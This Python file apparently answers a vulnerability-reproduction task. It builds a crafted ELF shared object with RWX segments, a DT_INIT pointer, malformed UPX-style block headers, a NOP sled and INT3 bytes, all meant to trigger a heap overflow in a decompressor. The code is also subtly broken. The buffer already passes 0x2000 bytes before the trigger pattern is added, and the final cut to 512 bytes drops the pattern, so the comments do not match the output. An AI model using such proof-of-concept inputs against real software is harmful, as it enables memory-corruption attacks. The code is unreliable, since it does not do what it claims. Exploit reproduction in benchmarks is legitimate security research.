import os
import struct
import subprocess
import tempfile
from pathlib import Path

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a minimal ELF header for a shared library
        poc = bytearray()
        
        # ELF header (64-bit)
        poc.extend(b'\x7fELF\x02\x01\x01')  # e_ident
        poc.extend(b'\x00' * 9)  # padding
        poc.extend(struct.pack('<H', 3))  # e_type = ET_DYN (shared object)
        poc.extend(struct.pack('<H', 0x3e))  # e_machine = x86-64
        poc.extend(struct.pack('<I', 1))  # e_version = EV_CURRENT
        poc.extend(struct.pack('<Q', 0))  # e_entry
        poc.extend(struct.pack('<Q', 64))  # e_phoff (program header offset)
        poc.extend(struct.pack('<Q', 0))  # e_shoff
        poc.extend(struct.pack('<I', 0))  # e_flags
        poc.extend(struct.pack('<H', 64))  # e_ehsize
        poc.extend(struct.pack('<H', 56))  # e_phentsize
        poc.extend(struct.pack('<H', 3))  # e_phnum (3 program headers)
        poc.extend(struct.pack('<H', 0))  # e_shentsize
        poc.extend(struct.pack('<H', 0))  # e_shnum
        poc.extend(struct.pack('<H', 0))  # e_shstrndx
        
        # Program header 1: PT_LOAD (executable)
        poc.extend(struct.pack('<I', 1))  # p_type = PT_LOAD
        poc.extend(struct.pack('<I', 7))  # p_flags = RWX
        poc.extend(struct.pack('<Q', 0))  # p_offset
        poc.extend(struct.pack('<Q', 0))  # p_vaddr
        poc.extend(struct.pack('<Q', 0))  # p_paddr
        poc.extend(struct.pack('<Q', 0x1000))  # p_filesz
        poc.extend(struct.pack('<Q', 0x1000))  # p_memsz
        poc.extend(struct.pack('<Q', 0x1000))  # p_align
        
        # Program header 2: PT_LOAD (data)
        poc.extend(struct.pack('<I', 1))  # p_type = PT_LOAD
        poc.extend(struct.pack('<I', 7))  # p_flags = RWX
        poc.extend(struct.pack('<Q', 0x1000))  # p_offset
        poc.extend(struct.pack('<Q', 0x1000))  # p_vaddr
        poc.extend(struct.pack('<Q', 0x1000))  # p_paddr
        poc.extend(struct.pack('<Q', 0x2000))  # p_filesz
        poc.extend(struct.pack('<Q', 0x2000))  # p_memsz
        poc.extend(struct.pack('<Q', 0x1000))  # p_align
        
        # Program header 3: PT_DYNAMIC (with DT_INIT)
        poc.extend(struct.pack('<I', 2))  # p_type = PT_DYNAMIC
        poc.extend(struct.pack('<I', 7))  # p_flags = RWX
        poc.extend(struct.pack('<Q', 0x2000))  # p_offset
        poc.extend(struct.pack('<Q', 0x2000))  # p_vaddr
        poc.extend(struct.pack('<Q', 0x2000))  # p_paddr
        poc.extend(struct.pack('<Q', 512))  # p_filesz
        poc.extend(struct.pack('<Q', 512))  # p_memsz
        poc.extend(struct.pack('<Q', 8))  # p_align
        
        # Pad to 0x1000
        poc.extend(b'\x00' * (0x1000 - len(poc)))
        
        # Data section
        poc.extend(b'\x41' * 0x1000)  # Fill with 'A's
        
        # Dynamic section at 0x2000
        # DT_INIT entry pointing to controlled memory
        poc.extend(struct.pack('<Q', 0x0c))  # DT_INIT tag
        poc.extend(struct.pack('<Q', 0x3000))  # d_ptr - points to memory we control
        poc.extend(struct.pack('<Q', 0))  # DT_NULL
        poc.extend(struct.pack('<Q', 0))  # DT_NULL
        
        # Fill rest with pattern that will cause overflow during decompression
        # This pattern simulates the b_info structure with inconsistent method resetting
        remaining = 512 - len(poc)
        
        # Create UPX-like b_info headers with inconsistent method fields
        # Structure: sz_unc (4), sz_cpr (4), method (4), filter (1), cto (1)
        upx_magic = b"UPX!"
        
        # First block - normal
        block1 = struct.pack('<IIIBB', 256, 128, 2, 0, 0)
        
        # Second block - triggers vulnerability
        # Large uncompressed size with small compressed size and method 0
        # This causes the decompressor to allocate large buffer but read little
        block2 = struct.pack('<IIIBB', 0x10000, 64, 0, 0x50, 0)
        
        # Third block - overflow trigger
        # Even larger size to cause heap overflow
        block3 = struct.pack('<IIIBB', 0x20000, 128, 1, 0x80, 0)
        
        vuln_pattern = upx_magic + block1 + block2 + block3
        vuln_pattern += b'\x90' * 200  # NOP sled
        vuln_pattern += b'\xcc' * 50   # INT3 for crash
        
        # Add the vulnerability triggering pattern
        poc.extend(vuln_pattern[:remaining])
        
        # Pad to exactly 512 bytes as ground-truth
        if len(poc) < 512:
            poc.extend(b'\x00' * (512 - len(poc)))
        elif len(poc) > 512:
            poc = poc[:512]
        
        return bytes(poc)
